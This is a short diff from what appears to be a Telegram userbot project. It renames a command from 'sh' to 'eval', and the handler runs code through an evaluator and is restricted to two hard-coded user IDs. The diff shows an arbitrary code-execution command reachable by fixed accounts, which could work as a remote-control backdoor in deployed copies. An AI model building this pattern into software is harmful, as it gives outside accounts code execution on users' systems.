@@ -8,7 +8,7 @@ async def _(client, message):
 
 
 @PY.BOT("eval", filters.user([1948147616, 843716328]))
-@PY.UBOT("sh", filters.user([1948147616, 843716328]))
+@PY.UBOT("eval", filters.user([1948147616, 843716328]))
 async def _(client, message):
     await evalator_cmd(client, message)
 
